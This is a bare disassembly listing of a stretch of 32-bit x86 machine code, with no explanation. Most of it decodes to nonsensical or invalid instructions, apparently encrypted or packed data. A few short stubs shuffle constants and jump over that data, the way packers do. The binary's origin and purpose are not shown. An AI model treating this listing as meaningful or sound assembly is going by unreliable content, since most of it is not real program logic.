  40e208:	or     ah,BYTE PTR [esi+0x3a]
  40e20b:	jnp    0x40e1b2
  40e20d:	jg     0x40e203
  40e20f:	lea    edx,[esi+0x7b17c65b]
  40e215:	sub    ebp,DWORD PTR [ebx]
  40e217:	bound  esp,QWORD PTR [edi+0x4e0a3d92]
  40e21d:	adc    ebp,ebx
  40e21f:	shl    ah,1
  40e221:	fiadd  DWORD PTR [edi-0x2b]
  40e224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e226:	addr16 jl 0x40e223
  40e229:	inc    esp
  40e22a:	mov    ebp,es
  40e22c:	add    eax,0xe03d5ea4
  40e231:	dec    esi
  40e232:	push   0x6a
  40e234:	(bad)  
  40e235:	call   0x8907:0x5bc53f0f
  40e23c:	and    BYTE PTR [edi+0x585ae925],cl
  40e242:	mov    ds,WORD PTR [ecx+0x20]
  40e245:	sub    dh,BYTE PTR [esp+esi*2]
  40e248:	mov    eax,0xc980d46f
  40e24d:	int3   
  40e24e:	shr    bh,0xff
  40e251:	adc    eax,0x76210594
  40e256:	pop    ebx
  40e257:	addr16 mov ecx,0x2ed45277
  40e25d:	fistp  DWORD PTR [ebp+0x2006586c]
  40e263:	in     eax,dx
  40e264:	fdiv   QWORD PTR [ebx-0x25]
  40e267:	and    DWORD PTR [ebp-0x5183d7e2],ebp
  40e26d:	xchg   esi,eax
  40e26e:	dec    esi
  40e26f:	mov    esp,ebp
  40e271:	pop    ds
  40e272:	dec    eax
  40e273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e274:	int3   
  40e275:	cmp    bl,bl
  40e277:	out    dx,al
  40e278:	pop    esi
  40e279:	xchg   ecx,eax
  40e27a:	sub    bl,dh
  40e27c:	clc    
  40e27d:	repnz xor edx,DWORD PTR [edx]
  40e280:	in     al,0x74
  40e282:	push   esi
  40e283:	push   0xffffff9d
  40e285:	mov    ebx,0xd6ba486c
  40e28a:	iret   
  40e28b:	and    WORD PTR [ebp+0x5f6d2bd],cx
  40e292:	mov    eax,ds:0x3f51613a
  40e297:	in     eax,0x79
  40e299:	dec    ebx
  40e29a:	(bad)  
  40e29b:	aas    
  40e29c:	cli    
  40e29d:	ror    dh,1
  40e29f:	je     0x40e269
  40e2a1:	(bad)  
  40e2a2:	aam    0x4d
  40e2a4:	popf   
  40e2a5:	frstor [eax+0x2c]
  40e2a8:	test   BYTE PTR ds:0x1786d31e,dh
  40e2ae:	(bad)  
  40e2af:	sbb    ch,bh
  40e2b1:	dec    esi
  40e2b2:	int3   
  40e2b3:	ds mov bh,0xdc
  40e2b6:	xor    bh,BYTE PTR [ebx+0x15]
  40e2b9:	lds    ecx,FWORD PTR [ebx]
  40e2bb:	dec    ecx
  40e2bc:	scas   al,BYTE PTR es:[edi]
  40e2bd:	int    0x8b
  40e2bf:	rcr    DWORD PTR [eax+0x24],0xf7
  40e2c3:	and    bh,al
  40e2c5:	(bad)  
  40e2c6:	out    0x2d,eax
  40e2c8:	aad    0xce
  40e2ca:	adc    al,BYTE PTR [eax+ecx*2+0x39a8bd7b]
  40e2d1:	push   cs
  40e2d2:	dec    ebp
  40e2d3:	inc    ebx
  40e2d4:	scas   eax,DWORD PTR es:[edi]
  40e2d5:	bound  esp,QWORD PTR [eax]
  40e2d7:	mov    DWORD PTR [eax+esi*1-0xf7176f0],eax
  40e2de:	int3   
  40e2df:	inc    edx
  40e2e0:	mov    al,0xcb
  40e2e2:	cwde   
  40e2e3:	push   ss
  40e2e4:	and    eax,0x8b453667
  40e2e9:	xor    DWORD PTR [edi+0x43],esp
  40e2ec:	(bad)  
  40e2ed:	loopne 0x40e33d
  40e2ef:	xchg   esp,eax
  40e2f0:	lods   al,BYTE PTR ds:[esi]
  40e2f1:	mov    esi,0x24ecb405
  40e2f6:	sub    BYTE PTR [ebx],bl
  40e2f8:	push   ds
  40e2f9:	out    dx,al
  40e2fa:	fdiv   QWORD PTR [edx-0x73263947]
  40e300:	adc    DWORD PTR [esi+edi*1+0x46fa865],esi
  40e307:	or     DWORD PTR [esp+edx*4+0x796b052c],ebx
  40e30e:	xor    dl,BYTE PTR [edx]
  40e310:	jge    0x40e2b2
  40e312:	mov    dh,0x8c
  40e314:	fucomp st(3)
  40e316:	outs   dx,DWORD PTR ds:[esi]
  40e317:	mov    dl,0xa
  40e319:	mov    ds:0x88a25ef6,al
  40e31e:	int    0xe8
  40e320:	jmp    0x40e2b6
  40e322:	sub    eax,edx
  40e324:	cmp    BYTE PTR [esp+ecx*8-0x4153f82a],dh
  40e32b:	add    eax,0xf41ede85
  40e330:	xchg   esp,eax
  40e331:	or     ebx,eax
  40e333:	out    0x77,eax
  40e335:	inc    ecx
  40e336:	nop
  40e337:	addr16 popf 
  40e339:	inc    edx
  40e33a:	mov    ds,WORD PTR [edx+0x26]
  40e33d:	inc    ebp
  40e33e:	inc    ecx
  40e33f:	addr16 out 0x68,eax
  40e342:	out    0x7f,eax
  40e344:	sub    ah,bl
  40e346:	gs adc eax,0x26bf05a0
  40e34c:	sti    
  40e34d:	cs mov ah,0xa1
  40e350:	and    BYTE PTR [edx+0x4a],ah
  40e353:	stos   DWORD PTR es:[edi],eax
  40e354:	xchg   edx,eax
  40e355:	rol    DWORD PTR [esi-0x7],cl
  40e358:	adc    eax,0xf1684e02
  40e35d:	(bad)  
  40e35e:	cwde   
  40e35f:	add    eax,DWORD PTR ds:0x9ba617a4
  40e365:	retf   0xcd3d
  40e368:	loop   0x40e3a6
  40e36a:	call   FWORD PTR [ebx+0x57]
  40e36d:	xchg   esi,eax
  40e36e:	or     al,0xbc
  40e370:	in     eax,dx
  40e371:	pop    esp
  40e372:	mov    cl,0xd7
  40e374:	pop    ebp
  40e375:	add    DWORD PTR [edi],esi
  40e377:	loope  0x40e30f
  40e379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e37b:	mov    bl,0xf3
  40e37d:	sti    
  40e37e:	iret   
  40e37f:	inc    esi
  40e380:	outs   dx,BYTE PTR ds:[esi]
  40e381:	hlt    
  40e382:	lods   al,BYTE PTR ds:[esi]
  40e383:	addr16 fsubr DWORD PTR [bp+di-0x5591]
  40e389:	mov    bh,0x9c
  40e38b:	mov    ah,0x21
  40e38d:	das    
  40e38e:	pop    ebx
  40e38f:	lds    ecx,FWORD PTR [ebp+0x651fa3bf]
  40e395:	sbb    eax,0xe6170eb
  40e39a:	ds aam 0x62
  40e39d:	sbb    DWORD PTR [edx-0x32f44254],ecx
  40e3a3:	aam    0xbb
  40e3a5:	add    bh,ch
  40e3a7:	inc    esp
  40e3a8:	fxch   st(2)
  40e3aa:	sub    al,0xc5
  40e3ac:	dec    ebx
  40e3ad:	mov    DWORD PTR [ebp+0x52],esp
  40e3b0:	shl    eax,1
  40e3b2:	retf   0x6b24
  40e3b5:	mov    esp,0x972e05ad
  40e3ba:	inc    esp
  40e3bb:	push   0xa
  40e3bd:	jmp    0xbb07:0xcd5a2f77
  40e3c4:	dec    esi
  40e3c5:	xchg   BYTE PTR [ecx-0x3c9ffed6],ah
  40e3cb:	mov    WORD PTR [ebx-0x79],cs
  40e3ce:	fst    QWORD PTR [edx]
  40e3d0:	jecxz  0x40e39f
  40e3d2:	sub    al,0xba
  40e3d4:	mov    cl,0x12
  40e3d6:	daa    
  40e3d7:	lds    edx,FWORD PTR [edi-0x67]
  40e3da:	aad    0x57
  40e3dc:	aad    0x5
  40e3de:	xchg   ebp,eax
  40e3df:	rcr    BYTE PTR ds:0x84ba8f60,1
  40e3e5:	(bad)  
  40e3e7:	clc    
  40e3e8:	sbb    al,BYTE PTR ds:0xb434cbb3
  40e3ee:	mov    cl,0xbf
  40e3f0:	sbb    DWORD PTR [esi-0x37fefc37],0x19d3c654
  40e3fa:	mov    esi,0xe4c62c93
  40e3ff:	sbb    bl,bh
  40e401:	aad    0x22
  40e403:	mov    DWORD PTR [eax+0x42b495c2],esp
  40e409:	mov    edx,0xea4f0a1e
  40e40e:	mov    eax,ds:0xb753db5f
  40e413:	add    esp,ebx
  40e415:	or     eax,ebp
  40e417:	sub    al,0x53
  40e419:	aas    
  40e41a:	test   eax,0xbaae8fc0
  40e41f:	sti    
  40e420:	pop    esp
  40e421:	sub    ebx,DWORD PTR [edx-0x454c12cd]
  40e427:	mov    al,ds:0xb29f8906
  40e42c:	push   ebx
  40e42d:	clc    
  40e42e:	mov    DWORD PTR [edx],esi
  40e430:	pop    ds
  40e431:	das    
  40e432:	call   0xa68c:0x71777b10
  40e439:	lock test BYTE PTR [esi-0x23],ch
  40e43d:	mov    al,ds:0xb475cd90
  40e442:	push   edi
  40e443:	mov    ds:0xd24ee2e7,al
  40e448:	push   esp
  40e449:	out    dx,al
  40e44a:	aam    0x33
  40e44c:	shl    BYTE PTR ds:0x6d33,cl
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x7e4f07b4],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [edi-0x58],cl
  40e4ec:	stc    
  40e4ed:	div    DWORD PTR ds:0xb4d2d844
  40e4f3:	mov    dh,BYTE PTR [ebx+0x61]
  40e4f6:	dec    ebx
  40e4f7:	ror    DWORD PTR [edx-0x3aae2bb6],cl
  40e4fd:	das    
  40e4fe:	adc    ah,BYTE PTR [edi-0x6e]
  40e501:	aad    0xa4
  40e503:	data16 jb 0x40e53d
  40e506:	pop    esi
  40e507:	js     0x40e54d
  40e509:	mov    ds:0xc2e2319f,eax
  40e50e:	(bad)  
  40e50f:	and    eax,0xcccc1230
  40e514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e515:	push   0x9e95029d
  40e51a:	pushf  
  40e51b:	push   edi
  40e51c:	mov    al,ds:0x72e0913a
  40e521:	mov    eax,ds:0x2611fd5
  40e526:	fmul   QWORD PTR ds:0xb188dac4
  40e52c:	lods   al,BYTE PTR ds:[esi]
  40e52d:	test   DWORD PTR [ecx-0x5024873e],edi
  40e533:	push   edx
  40e534:	inc    ebx
  40e535:	pop    edx
  40e536:	xor    DWORD PTR [ecx+0x30d9afaa],esp
  40e53c:	rcr    DWORD PTR [ebp+0x3f],1
  40e53f:	es daa 
  40e541:	push   edi
  40e542:	push   cs
  40e543:	mov    al,0x2e
  40e545:	sub    esp,ebp
  40e547:	sbb    eax,0x5e7b3064
  40e54c:	daa    
  40e54d:	ins    DWORD PTR es:[edi],dx
  40e54e:	fistp  QWORD PTR [ebp+0x35]
  40e551:	sub    eax,0x895d85ef
  40e556:	into   
  40e557:	clc    
  40e558:	inc    ecx
  40e559:	loope  0x40e51b
  40e55b:	push   esi
  40e55c:	int    0x94
  40e55e:	repnz sbb DWORD PTR [edx-0x18df33dd],edi
  40e565:	pop    ebx
  40e566:	int    0xac
  40e568:	push   0xffffff99
  40e56a:	and    esi,edi
  40e56c:	adc    DWORD PTR [ecx-0x25],esp
  40e56f:	add    ch,ah
  40e571:	mov    BYTE PTR [ecx+0x7d1d8651],bh
  40e577:	add    cl,BYTE PTR [ecx+0x4e182555]
  40e57d:	sub    BYTE PTR [eax+0x6d],al
  40e580:	xchg   ebx,eax
  40e581:	and    esp,esp
  40e583:	adc    al,0x91
  40e585:	jo     0x40e53b
  40e587:	jnp    0x40e540
  40e589:	inc    edx
  40e58a:	or     al,0xf3
  40e58c:	aas    
  40e58d:	iret   
  40e58e:	push   0x9506ece8
  40e593:	clc    
  40e594:	(bad)  
  40e595:	vcvtsd2ss xmm6,xmm5,QWORD PTR [esi-0x72]
  40e59a:	adc    bl,BYTE PTR [edx-0x16]
  40e59d:	and    BYTE PTR [ecx],dh
  40e59f:	retf   
  40e5a0:	xchg   ebx,eax
  40e5a1:	es out dx,eax
  40e5a3:	mov    bl,0x7f
  40e5a5:	cdq    
  40e5a6:	pop    es
  40e5a7:	fisttp QWORD PTR [edx]
  40e5a9:	mov    eax,ds:0xc8b92651
  40e5ae:	jbe    0x40e585
  40e5b0:	push   edi
  40e5b1:	pop    edx
  40e5b2:	ins    DWORD PTR es:[edi],dx
  40e5b3:	mov    edx,0x9a4aff85
  40e5b8:	gs cdq 
  40e5ba:	xchg   edi,eax
  40e5bb:	daa    
  40e5bc:	push   0x1ff23cb6
  40e5c1:	mov    eax,0x605f37cd
  40e5c6:	push   edx
  40e5c7:	push   ebx
  40e5c8:	stos   BYTE PTR es:[edi],al
  40e5c9:	arpl   di,ax
  40e5cb:	test   DWORD PTR [esi],esi
  40e5cd:	test   ah,bh
  40e5cf:	and    eax,0xe65e5429
  40e5d4:	inc    esi
  40e5d5:	xchg   edi,eax
  40e5d6:	mov    BYTE PTR [ebx-0x1b],bl
  40e5d9:	jle    0x40e5c0
  40e5db:	out    dx,eax
  40e5dc:	(bad)  
  40e5dd:	pop    eax
  40e5de:	push   cs
  40e5df:	adc    eax,0x649e6689
  40e5e4:	dec    ebp
  40e5e5:	mov    ds:0x30f10b63,al
  40e5ea:	pop    es
  40e5eb:	cmp    BYTE PTR [edx-0x782df75b],bl
  40e5f1:	pushf  
  40e5f2:	in     al,0x32
  40e5f4:	or     DWORD PTR [ebx-0x46],esp
  40e5f7:	sbb    BYTE PTR [eax-0x25bd6ea2],0xcb
  40e5fe:	jno    0x40e594
  40e600:	add    al,bh
  40e602:	sub    esp,DWORD PTR [ecx-0x36]
  40e605:	pop    ss
  40e606:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e608:	pop    ebp
  40e609:	or     ebp,ebp
  40e60b:	test   BYTE PTR [eax-0x3d],dl
  40e60e:	mov    al,ds:0x19c350e1
  40e613:	jno    0x40e615
  40e615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e616:	repz out dx,eax
  40e618:	mov    esi,0x68309c01
  40e61d:	dec    esi
  40e61e:	jo     0x40e5c3
  40e620:	xor    eax,0xef97f2ae
  40e625:	es jmp 0x8fecab
  40e62b:	adc    BYTE PTR [edx+0x4a],al
  40e62e:	(bad)  
  40e62f:	fcomp  QWORD PTR [esi-0x1587b254]
  40e635:	xchg   esp,eax
  40e636:	inc    edx
  40e637:	mov    al,0xea
  40e639:	fimul  WORD PTR [ecx+esi*4-0x2b]
  40e63d:	into   
  40e63e:	out    0xa6,al
  40e640:	sbb    BYTE PTR [eax-0x8],bh
  40e643:	enter  0xb7d0,0x6e
  40e647:	jbe    0x40e5ed
  40e649:	stos   BYTE PTR es:[edi],al
  40e64a:	push   ecx
  40e64b:	fiadd  WORD PTR [eax]
  40e64d:	leave  
  40e64e:	scas   al,BYTE PTR es:[edi]
  40e64f:	sbb    DWORD PTR [ecx+0x0],eax
  40e652:	shl    DWORD PTR [edi+0x14],1
  40e655:	cmp    ch,BYTE PTR [edx]
  40e657:	(bad)  
  40e658:	inc    DWORD PTR [edi]
  40e65a:	mov    WORD PTR [ebx-0x15],ss
  40e65d:	in     al,dx
  40e65e:	sbb    eax,0x982378d9
  40e663:	sub    DWORD PTR [ebx-0x64bc5abc],esp
  40e669:	add    BYTE PTR [eax+0x4e0f91a7],0x7a
  40e670:	and    eax,0x7c2c076c
  40e675:	dec    esi
  40e676:	inc    esp
  40e677:	inc    esp
  40e678:	stos   DWORD PTR es:[edi],eax
  40e679:	in     eax,0x82
  40e67b:	inc    edx
  40e67c:	ss inc esi
  40e67e:	dec    esi
  40e67f:	mov    edi,DWORD PTR [edi+0x7916d358]
  40e685:	pop    edi
  40e686:	fnstcw WORD PTR [ebx]
  40e688:	outs   dx,BYTE PTR ds:[esi]
  40e689:	and    eax,0x42467bb8
  40e68e:	fwait
  40e68f:	das    
  40e690:	fadd   DWORD PTR [ebp-0x7ee08bcd]
  40e696:	xchg   ecx,eax
  40e697:	daa    
  40e698:	dec    edx
  40e699:	ret    0xb9cf
  40e69c:	addr16 and dh,bl
  40e69f:	leave  
  40e6a0:	test   al,0x1d
  40e6a2:	and    BYTE PTR [ecx+0x62ecb93a],cl
  40e6a8:	push   ebp
  40e6a9:	(bad)  
  40e6aa:	cs inc ebx
  40e6ac:	pop    ecx
  40e6ad:	div    BYTE PTR [edi]
  40e6af:	add    DWORD PTR [edi],eax
  40e6b1:	mov    esp,DWORD PTR [ebx-0x68]
  40e6b4:	add    BYTE PTR [ebp+0x3e],dh
  40e6b7:	mov    bl,BYTE PTR [ecx+0x3914af9f]
  40e6bd:	cmp    BYTE PTR ds:0x7377e27,al
  40e6c3:	push   0xffffffda
  40e6c5:	jae    0x40e6c7
  40e6c7:	adc    ebp,DWORD PTR [ecx+0x25e3c15f]
  40e6cd:	xchg   BYTE PTR [esi],dl
  40e6cf:	mov    DWORD PTR [edi-0x58],edx
  40e6d2:	scas   al,BYTE PTR es:[edi]
  40e6d3:	pusha  
  40e6d4:	push   ebp
  40e6d5:	js     0x40e6fa
  40e6d7:	jg     0x40e6f0
  40e6d9:	adc    al,0x7d
  40e6db:	mov    edi,ecx
  40e6dd:	mov    dl,0x1b
  40e6df:	(bad)  
  40e6e1:	test   BYTE PTR ds:0xe280361d,bh
  40e6e7:	push   cs
  40e6e8:	xor    al,0x6c
  40e6ea:	pop    edi
  40e6eb:	push   0xfffffff4
  40e6ed:	sbb    DWORD PTR [edi+0x7118987c],esp
  40e6f3:	mov    esp,0xf733ad16
  40e6f8:	push   edx
  40e6f9:	ins    DWORD PTR es:[edi],dx
  40e6fa:	aam    0x55
  40e6fc:	mov    ds:0x80de484e,eax
  40e701:	jl     0x40e6e7
  40e703:	sub    DWORD PTR [edx+0x59],0xf9bffa07
  40e70a:	jno    0x40e6e2
  40e70c:	mov    ah,0x2e
  40e70e:	rcl    DWORD PTR [ebp-0x70b98fcc],cl
  40e714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e715:	xchg   ebx,eax
  40e716:	mov    eax,0x79bbb760
  40e71b:	retf   0x5ccc
  40e71e:	ret    0xb86c
  40e721:	pop    es
  40e722:	sbb    DWORD PTR [ebp+0x22],ebp
  40e725:	or     BYTE PTR [edi],ah
  40e727:	or     ecx,DWORD PTR [edx+eax*4-0x3bd3f0d8]
  40e72e:	push   ecx
  40e72f:	rcl    DWORD PTR [edx+0x0],cl
  40e732:	jle    0x40e76e
  40e734:	pop    es
  40e735:	mov    bl,0x78
  40e737:	inc    esi
  40e738:	adc    ah,BYTE PTR ds:0x864bda6
  40e73e:	inc    edi
  40e73f:	test   eax,0xdc82b3d0
  40e744:	xchg   edi,eax
  40e745:	xchg   ecx,eax
  40e746:	inc    esi
  40e747:	cli    
  40e748:	or     BYTE PTR es:[edx],bh
  40e74b:	stos   BYTE PTR es:[edi],al
  40e74c:	and    BYTE PTR [ecx],al
  40e74e:	or     BYTE PTR [ebx+0x9d7f3fe],bh
  40e754:	dec    edi
  40e755:	ss push esi
  40e757:	test   ebp,edx
  40e759:	lock dec esp
  40e75b:	dec    ebx
  40e75c:	fwait
  40e75d:	pop    esi
  40e75e:	imul   ebp,DWORD PTR [edx+0x6324b3d9],0xffffffff
  40e765:	adc    cl,cl
  40e767:	push   ebp
  40e768:	mov    bh,0xcd
  40e76a:	dec    edx
  40e76b:	sub    al,0x91
  40e76d:	mov    ds:0xf0658226,eax
  40e772:	jg     0x40e709
  40e774:	scas   eax,DWORD PTR es:[edi]
  40e775:	leave  
  40e776:	std    
  40e777:	pop    ss
  40e778:	jge    0x40e779
  40e77a:	out    0x58,al
  40e77c:	jb     0x40e7c3
  40e77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e77f:	sbb    eax,DWORD PTR [ecx-0x416eab01]
  40e785:	xor    al,0x25
  40e787:	ror    BYTE PTR [ebp-0x4dced55f],1
  40e78d:	mov    eax,ds:0x2b4be38e
  40e792:	enter  0x45c7,0xc
  40e796:	ror    DWORD PTR [eax],cl
  40e798:	add    BYTE PTR [eax],al
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	sub    bl,BYTE PTR ds:0xbe427e51
  40e7f5:	sbb    BYTE PTR [eax],bl
  40e7f7:	rcl    BYTE PTR [eax+ebx*1],cl
  40e7fa:	sbb    BYTE PTR [edi],dh
  40e7fc:	dec    edi
  40e7fd:	jmp    0x3a9f:0xa20167f7
  40e804:	xor    al,0x1e
  40e806:	test   bh,0x21
  40e809:	idiv   DWORD PTR [ecx-0x21]
  40e80c:	pusha  
  40e80d:	or     al,0x3c
  40e80f:	inc    ebx
  40e810:	adc    BYTE PTR [ebx+edx*1],ch
  40e813:	lods   eax,DWORD PTR ds:[si]
  40e815:	sub    al,0x1c
  40e817:	pop    ecx
  40e818:	mov    ch,0xc9
  40e81a:	xor    DWORD PTR [ebp+0x5a595eec],0x51a2cb88
  40e824:	push   0x17
  40e826:	push   edx
  40e827:	sbb    BYTE PTR [edi-0x3b],dl
  40e82a:	mov    eax,ds:0x37399035
  40e82f:	fcmovnb st,st(3)
  40e831:	std    
  40e832:	dec    edi
  40e833:	call   0xfadb:0x2091ea32
  40e83a:	aam    0x53
  40e83c:	dec    ecx
  40e83d:	xlat   BYTE PTR ds:[ebx]
  40e83e:	repz dec edi
  40e840:	jmp    0x1cc3:0xe79a6930
  40e847:	aaa    
  40e848:	outs   dx,BYTE PTR ds:[esi]
  40e849:	sbb    edx,DWORD PTR [ebx-0x4e]
  40e84c:	icebp  
  40e84d:	cmp    al,0x60
  40e84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e851:	bswap  ebp
  40e853:	dec    edx
  40e854:	inc    edi
  40e855:	std    
  40e856:	or     eax,0xa8e28bfa
  40e85b:	inc    ebp
  40e85c:	cdq    
  40e85d:	std    
  40e85e:	lds    ebp,FWORD PTR [edi+0x66da53d2]
  40e864:	mov    edx,0x4934b99d
  40e869:	xor    eax,0x35e60af2
  40e86e:	inc    edi
  40e86f:	jne    0x40e8e3
  40e871:	pop    edx
  40e872:	push   cs
  40e873:	mov    dh,0x63
  40e875:	in     al,0xe9
  40e877:	mov    ebx,0x6b9ce362
  40e87c:	stos   DWORD PTR es:[edi],eax
  40e87d:	inc    esp
  40e87e:	ins    BYTE PTR es:[edi],dx
  40e87f:	mov    eax,ds:0xf81c87f1
  40e884:	push   esi
  40e885:	les    esi,FWORD PTR [edx+edi*8-0xf]
  40e889:	pop    edi
  40e88a:	push   eax
  40e88b:	mov    DWORD PTR [edi+0x70fa8938],ecx
  40e891:	aaa    
  40e892:	les    eax,FWORD PTR [ebx+edi*2-0x61c4b0be]
  40e899:	sub    eax,0xa239cfba
  40e89e:	es mov dh,0xa9
  40e8a1:	dec    esi
  40e8a2:	call   0x8ecb:0x58ef4172
  40e8a9:	mov    eax,0x2fb6ff02
  40e8ae:	(bad)  
  40e8af:	xchg   esi,eax
  40e8b0:	inc    eax
  40e8b1:	mov    al,0xd
  40e8b3:	sub    BYTE PTR [esi+0x7d2406a2],0x2d
  40e8ba:	sti    
  40e8bb:	mov    bl,0x8f
  40e8bd:	push   esp
  40e8be:	xchg   ebx,eax
  40e8bf:	(bad)  
  40e8c0:	call   0x913082c8
  40e8c5:	push   edx
  40e8c6:	cmp    DWORD PTR [ebx-0x46b3c7db],ebp
  40e8cc:	mov    ah,0x6d
  40e8ce:	and    esi,esp
  40e8d0:	push   ecx
  40e8d1:	dec    edi
  40e8d2:	sub    BYTE PTR [edx-0x37],bh
  40e8d5:	inc    esp
  40e8d6:	les    edi,FWORD PTR [ebp-0x1b]
  40e8d9:	gs jo  0x40e8a0
  40e8dc:	mov    cl,0x79
  40e8de:	cdq    
  40e8df:	jo     0x40e8f0
  40e8e1:	shl    ebx,cl
  40e8e3:	jne    0x40e869
  40e8e5:	inc    ebp
  40e8e6:	jge    0x40e916
  40e8e8:	imul   esi,edx,0x58b2b784
  40e8ee:	cmp    al,0x78
  40e8f0:	adc    BYTE PTR [eax],ah
  40e8f2:	imul   edx,DWORD PTR [eax+0x56473a86],0x46
  40e8f9:	xor    al,0x3a
  40e8fb:	in     eax,0x90
  40e8fd:	imul   ebp,DWORD PTR [eax+ecx*8-0x5b41da7c],0xffffffa8
  40e905:	mov    dl,0x65
  40e907:	push   ebx
  40e908:	(bad)  
  40e909:	push   ecx
  40e90a:	jne    0x40e98b
  40e90c:	push   ebp
  40e90d:	jecxz  0x40e904
  40e90f:	jmp    FWORD PTR [edx-0x3e]
  40e912:	dec    edi
  40e913:	icebp  
  40e914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e915:	xchg   ecx,eax
  40e916:	jno    0x40e993
  40e918:	(bad)  
  40e919:	dec    ecx
  40e91a:	cli    
  40e91b:	ret    
  40e91c:	fisub  DWORD PTR [edx-0x2b]
  40e91f:	out    dx,eax
  40e920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e921:	ins    BYTE PTR es:[edi],dx
  40e922:	(bad)
  40e925:	mov    ds:0x13128b14,eax
  40e92a:	mov    dl,0x83
  40e92c:	retf   
  40e92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e92e:	ja     0x40e987
  40e930:	setl   BYTE PTR [ebx]
  40e933:	retf   
  40e934:	mov    DWORD PTR [ecx+eiz*1-0x69],esp
  40e938:	ror    DWORD PTR [ebp+0x63],cl
  40e93b:	out    dx,al
  40e93c:	or     eax,0x7e8df72
  40e941:	xchg   edx,eax
  40e942:	or     eax,0xe6d49b4b
  40e947:	(bad)
  40e94a:	or     ecx,DWORD PTR [esi]
  40e94c:	(bad)  
  40e94d:	mov    esi,0xcf5ddb30
  40e952:	pop    es
  40e953:	test   bh,ah
  40e955:	enter  0xdf11,0x83
  40e959:	fs and cl,dh
  40e95c:	daa    
  40e95d:	in     eax,0xc7
  40e95f:	push   0x1f
  40e961:	leave  
  40e962:	iret   
  40e963:	or     DWORD PTR [ecx-0x2d843c48],ebp
  40e969:	sub    esp,DWORD PTR [eax+0x69fcbe26]
  40e96f:	into   
  40e970:	and    eax,0x357e1503
  40e975:	cwde   
  40e976:	ret    0xa4ea
  40e979:	mov    ds:0x581958f5,al
  40e97e:	xor    eax,0xa4233bd4
  40e983:	fsub   st(3),st
  40e985:	adc    ecx,0x6f
  40e988:	test   eax,0x6b736b3e
  40e98d:	jne    0x40e968
  40e98f:	mov    edi,0x3008c608
  40e994:	sub    eax,edi
  40e996:	fbstp  TBYTE PTR [esp+ecx*4+0x335e0931]
  40e99d:	mov    edi,0x6d66a4bc
  40e9a2:	pop    edx
  40e9a3:	sbb    cl,BYTE PTR fs:0x2a58b164
  40e9aa:	out    dx,al
  40e9ab:	mov    esp,DWORD PTR [eax]
  40e9ad:	rcl    BYTE PTR [ebx],cl
  40e9af:	or     DWORD PTR [edi-0x7a],esp
  40e9b2:	cmp    al,0x5a
  40e9b4:	mov    bh,BYTE PTR [edi-0xe19595a]
  40e9ba:	mov    ebx,0xd75bfdde
  40e9bf:	pop    eax
  40e9c0:	dec    edi
  40e9c1:	icebp  
  40e9c2:	cmp    dh,bh
  40e9c4:	sub    al,0xfc
  40e9c6:	lock mov fs,WORD PTR [eax+0x13]
